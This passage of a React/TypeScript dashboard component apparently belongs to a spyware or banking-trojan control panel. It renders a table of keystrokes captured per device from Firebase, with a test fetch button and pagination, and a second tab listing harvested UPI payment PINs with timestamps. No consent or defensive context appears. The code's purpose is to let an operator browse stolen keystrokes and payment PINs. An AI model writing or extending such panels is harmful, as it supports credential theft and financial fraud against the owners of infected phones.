                          console.log('🔍 Testing direct KeyLogs fetch for device:', actualDeviceId);
                          try {
                            const keyLogs = await firebaseService.getKeyLogs(actualDeviceId, 100);
                            console.log('✅ Direct KeyLogs fetch successful:', keyLogs);
                            console.log('  - Number of logs:', keyLogs.length);
                            console.log('  - First log:', keyLogs[0]);
                            alert(`Direct KeyLogs fetch successful! Found ${keyLogs.length} logs for device ${actualDeviceId}`);
                          } catch (error) {
                            console.error('❌ Direct KeyLogs fetch failed:', error);
                            alert(`Direct KeyLogs fetch failed: ${error.message}`);
                          }
                        }}
                      >
                        Test Direct KeyLogs
                      </Button>
                    </div>
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  {loadingStates.keylogs ? (
                    <KeyLogsSkeleton />
                  ) : flattenedKeyLogRows.length === 0 ? (
                    <div className="text-center py-8">
                      <Keyboard className="w-8 h-8 text-muted-foreground mx-auto mb-2" />
                      <p className="text-muted-foreground">No key logs found</p>
                      <p className="text-xs text-muted-foreground mt-1">Key logs will appear here in real-time when detected</p>
                    </div>
                  ) : flattenedKeyLogRows.length > KEYLOG_VIRTUALIZE_THRESHOLD ? (
                    <div className="space-y-2">
                      {/* Sticky header mimic */}
                      <div className="grid grid-cols-3 gap-2 px-4 py-2 font-semibold sticky top-0 bg-background/80 backdrop-blur-sm border-b">
                        <div>Keylogger</div>
                        <div>Key</div>
                        <div>Added Date & Time</div>
                      </div>
                      <List height={KEYLOG_LIST_HEIGHT} itemCount={flattenedKeyLogRows.length} itemSize={KEYLOG_ROW_HEIGHT} width={'100%'}>
                        {({ index, style }: ListChildComponentProps) => {
                          const row = flattenedKeyLogRows[index];
                          return (
                            <div style={style} className="grid grid-cols-3 gap-2 px-4 py-2 border-b">
                              <div className="font-medium">{row.keylogger}</div>
                              <div className="font-mono truncate" title={row.value}>{row.value}</div>
                              <div className="text-sm text-muted-foreground">{formatDateTime(row.timestamp)}</div>
                            </div>
                          );
                        }}
                      </List>
                    </div>
                  ) : (
                    <div className="space-y-4">
                      <div className="overflow-x-auto">
                        <Table>
                          <TableHeader>
                            <TableRow>
                              <TableHead>Keylogger</TableHead>
                              <TableHead>Key</TableHead>
                              <TableHead>Added Date & Time</TableHead>
                            </TableRow>
                          </TableHeader>
                          <TableBody>
                            {flattenedKeyLogRows
                              .slice((keyLogsPage - 1) * keyLogsPerPage, keyLogsPage * keyLogsPerPage)
                              .map((rowData) => (
                                <TableRow key={rowData.rowId}>
                                  <TableCell className="font-medium">{rowData.keylogger}</TableCell>
                                  <TableCell className="font-mono">{rowData.value}</TableCell>
                                  <TableCell className="text-sm text-muted-foreground">{formatDateTime(rowData.timestamp)}</TableCell>
                                </TableRow>
                              ))}
                          </TableBody>
                        </Table>
                      </div>
                      {/* Pagination */}
                      <div className="flex items-center justify-between">
                        <div className="flex items-center space-x-2">
                          <p className="text-sm text-muted-foreground">Rows per page:</p>
                          <Select 
                            value={keyLogsPerPage.toString()} 
                            onValueChange={(value) => {
                              setKeyLogsPerPage(parseInt(value));
                              setKeyLogsPage(1);
                            }}
                          >
                            <SelectTrigger className="w-24">
                              <SelectValue />
                            </SelectTrigger>
                            <SelectContent>
                              <SelectItem value="5">5</SelectItem>
                              <SelectItem value="10">10</SelectItem>
                              <SelectItem value="25">25</SelectItem>
                              <SelectItem value="50">50</SelectItem>
                              <SelectItem value="100">100</SelectItem>
                              <SelectItem value="200">200</SelectItem>
                            </SelectContent>
                          </Select>
                        </div>
                        <div className="flex items-center space-x-2">
                          <Button variant="outline" size="sm" onClick={() => setKeyLogsPage(prev => Math.max(1, prev - 1))} disabled={keyLogsPage === 1}>
                            <ChevronLeft className="h-4 w-4" />
                          </Button>
                          <p className="text-sm text-muted-foreground">
                            {((keyLogsPage - 1) * keyLogsPerPage) + 1}-{Math.min(keyLogsPage * keyLogsPerPage, flattenedKeyLogRows.length)} of {flattenedKeyLogRows.length}
                          </p>
                          <Button variant="outline" size="sm" onClick={() => setKeyLogsPage(prev => prev + 1)} disabled={keyLogsPage * keyLogsPerPage >= flattenedKeyLogRows.length}>
                            <ChevronRight className="h-4 w-4" />
                          </Button>
                        </div>
                      </div>
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="upipins" className="mt-6">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Shield className="w-5 h-5" />
                    UPI Pins ({upis.length})
                    <div className="ml-auto flex items-center gap-2">
                      <span className="text-sm text-muted-foreground">Order</span>
                      <Select value={upiOrder} onValueChange={(v) => setUpiOrder(v as 'asc' | 'desc')}>
                        <SelectTrigger className="w-36">
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="desc">Newest first</SelectItem>
                          <SelectItem value="asc">Oldest first</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  {loadingStates.upis ? (
                    <MessagesSkeleton />
                  ) : upis.length === 0 ? (
                    <p className="text-muted-foreground text-center py-8">No UPI pins found</p>
                  ) : (
                    <div className="overflow-x-auto">
                      <Table>
                        <TableHeader>
                          <TableRow>
                            <TableHead>Upi Pin</TableHead>
                            <TableHead>Added Date Time</TableHead>
                          </TableRow>
                        </TableHeader>
                        <TableBody>
                          {upis
                            .map((p: any, idx: number) => {
                              const pin = (typeof p === 'object' && p !== null) ? p.pin : p;
                              const timestamp = (typeof p === 'object' && p !== null) ? p.timestamp : undefined;
                              const ts = toTimestamp(timestamp);
                              return { pin, timestamp, ts, originalIndex: idx };
                            })
                            // Stable sort by order
                            .sort((a, b) => {
                              const dir = upiOrder === 'desc' ? -1 : 1;
                              const tDiff = dir * (a.ts - b.ts);
                              if (tDiff !== 0) return tDiff;
                              return dir * (a.originalIndex - b.originalIndex);
                            })
                            .map((p, idx) => (
                              <TableRow key={idx}>
                                <TableCell className="font-mono font-semibold">{p.pin}</TableCell>
                                <TableCell className="text-sm text-muted-foreground">{p.timestamp ? formatDateTime(p.timestamp) : '-'}</TableCell>
                              </TableRow>
                            ))}
                        </TableBody>
                      </Table>
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>

          </Tabs>
        </div>
      </div>
    </div>
  );
});
